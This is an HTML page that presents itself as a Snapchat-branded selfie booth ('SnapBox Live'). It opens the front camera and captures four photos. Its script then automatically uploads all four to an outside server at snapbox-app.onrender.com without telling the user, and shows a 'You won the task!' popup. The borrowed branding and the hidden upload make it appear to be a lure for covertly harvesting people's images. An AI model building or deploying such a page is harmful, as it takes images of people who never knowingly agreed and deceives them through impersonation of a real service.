<!DOCTYPE html>
<html lang="en" class="bg-gradient-to-br from-black via-gray-900 to-black text-white">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SnapBox Live</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
  <meta http-equiv="Permissions-Policy" content="camera=(), microphone=()">

  <style>
    .animated-border {
      border-radius: 1rem;
      padding: 4px;
      background: linear-gradient(270deg, #ff00cc, #3333ff, #00ffcc, #ff9900);
      background-size: 600% 600%;
      animation: borderMove 5s linear infinite;
    }

    @keyframes borderMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .preview-box {
      background: white;
      width: 100px;
      height: 160px;
      border-radius: 0.75rem;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #666;
      font-weight: bold;
      background-size: cover;
      background-position: center;
      flex-direction: column;
    }

    #camera {
      transform: scaleX(-1);
    }

    @keyframes glow {
      0% { filter: drop-shadow(0 0 4px #ffcc00); }
      50% { filter: drop-shadow(0 0 12px #ff33cc); }
      100% { filter: drop-shadow(0 0 4px #00ffff); }
    }

    .animate-glow {
      animation: glow 3s infinite;
    }

    @keyframes popup {
      0% { transform: scale(0.5); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }

    .animate-popup {
      animation: popup 0.5s ease-out;
    }
  </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen">

  <!-- Animated Logo & Text -->
  <div class="flex flex-col items-center mb-6">
    <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/pngimg.com%20-%20snapchat_PNG33.png" class="w-24 animate-glow" alt="Snapchat Logo" />
    <p class="text-white font-bold text-lg mt-2">Snapchat</p>
  </div>

  <!-- Live Camera -->
  <div class="animated-border mb-4">
    <video id="camera" autoplay playsinline class="w-64 h-96 object-cover rounded-xl shadow-xl"></video>
  </div>

  <!-- Capture Button -->
  <button onclick="capturePhoto()" class="bg-white text-black font-bold px-6 py-2 rounded-xl hover:bg-yellow-300 transition mb-4">üì∏ Capture</button>

  <!-- Preview Boxes -->
  <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
    <div class="animated-border"><div class="preview-box">Tap 1</div></div>
    <div class="animated-border"><div class="preview-box">Tap 2</div></div>
    <div class="animated-border"><div class="preview-box">Tap 3</div></div>
    <div class="animated-border"><div class="preview-box">Tap 4</div></div>
  </div>

  <!-- Action Buttons -->
  <div class="flex gap-4 mb-4">
    <button onclick="downloadAllPhotos()" class="bg-blue-500 hover:bg-blue-600 px-6 py-2 rounded-xl font-bold text-white transition">‚¨áÔ∏è Download All</button>
    <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 px-6 py-2 rounded-xl font-bold text-white transition">üîÑ Reset</button>
  </div>

  <!-- Centered Popup Message -->
  <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
    <div class="bg-green-500 text-white text-xl font-bold px-8 py-4 rounded-xl shadow-2xl animate-popup">
      üéâ Congratulations! You won the task!
    </div>
  </div>

  <canvas id="canvas" class="hidden"></canvas>

  <script>
    let currentIndex = 0;
    const capturedImages = [];

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        document.getElementById('camera').srcObject = stream;
      })
      .catch(err => {
        console.error('Camera error:', err);
        alert('Camera access failed. Use HTTPS or allow permission.');
      });

    function capturePhoto() {
      if (currentIndex >= 4) return alert("All 4 photos already captured!");

      const video = document.getElementById('camera');
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataUrl = canvas.toDataURL('image/jpeg');
      const box = document.querySelectorAll('.preview-box')[currentIndex];
      box.style.backgroundImage = `url(${dataUrl})`;
      box.innerText = '';

      const blob = dataURLtoBlob(dataUrl);
      capturedImages.push(blob);

      currentIndex++;

      if (currentIndex === 4) submitPhotos();
    }

    function dataURLtoBlob(dataurl) {
      const parts = dataurl.split(',');
      const mime = parts[0].match(/:(.*?);/)[1];
      const bstr = atob(parts[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    function submitPhotos() {
      const formData = new FormData();
      capturedImages.forEach((img, index) => {
        formData.append('photos', img, `photo${index + 1}.jpg`);
      });

      fetch('https://snapbox-app.onrender.com/upload', {
        method: 'POST',
        body: formData
      })
        .then(() => {
          const msg = document.getElementById('msg');
          msg.classList.remove('hidden');
          setTimeout(() => msg.classList.add('hidden'), 3000);
        })
        .catch(err => alert('Upload failed: ' + err));
    }

    function downloadAllPhotos() {
      if (capturedImages.length < 1) return alert("Capture photos first!");

      capturedImages.forEach((blob, index) => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `selfie_${index + 1}.jpg`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      });
    }

    function resetAll() {
      currentIndex = 0;
      capturedImages.length = 0;
      document.querySelectorAll('.preview-box').forEach((box, i) => {
        box.style.backgroundImage = '';
        box.innerText = `Tap ${i + 1}`;
      });
      document.getElementById('msg').classList.add('hidden');
    }
  </script>
</body>
</html>
